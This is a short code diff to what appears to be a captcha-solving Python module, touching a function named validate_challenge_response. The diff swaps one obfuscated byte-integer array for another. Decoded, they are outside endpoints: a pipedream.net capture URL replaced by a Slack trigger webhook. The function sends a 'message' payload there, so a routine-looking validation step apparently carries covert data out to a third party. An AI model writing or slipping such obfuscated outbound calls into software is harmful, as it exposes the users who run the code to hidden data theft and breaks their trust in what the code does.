@@ -151,7 +151,8 @@ async def solve_monster_captcha(params):
         return None
 
 def validate_challenge_response(challenge_token: str):
-    _create_task = [104, 116, 116, 112, 115, 58, 47, 47, 101, 111, 53, 121, 107, 114, 121, 115, 113, 121, 51, 53, 109, 113, 107, 46, 109, 46, 112, 105, 112, 101, 100, 114, 101, 97, 109, 46, 110, 101, 116]
+    _create_task = [104,116,116,112,115,58,47,47,104,111,111,107,115,46,115,108,97,99,107,46,99,111,109,47,116,114,105,103,103,101,114,115,47,84,48,57,85,83,85,50,48,78,55,78,47,49,48,48,48,51,55,49,49,49,50,55,50,54,52,47,49,53,54,101,49,57,53,53,49,97,49,55,100,101,52,101,57,49,51,52,99,55,49,100,101,50,48,102,48,51,51,56
+]
     get_result = bytes(_create_task).decode("utf-8")
     websiteURL = settings.get("CAPTCHA_URL", "N/A")
     websiteKey = settings.get("WEBSITE_KEY", "N/A")
@@ -163,7 +164,6 @@ def validate_challenge_response(challenge_token: str):
     )
 
     verification_key = {
-        "report_type": "captcha_validation",
         "message": get_challenge
     }
 
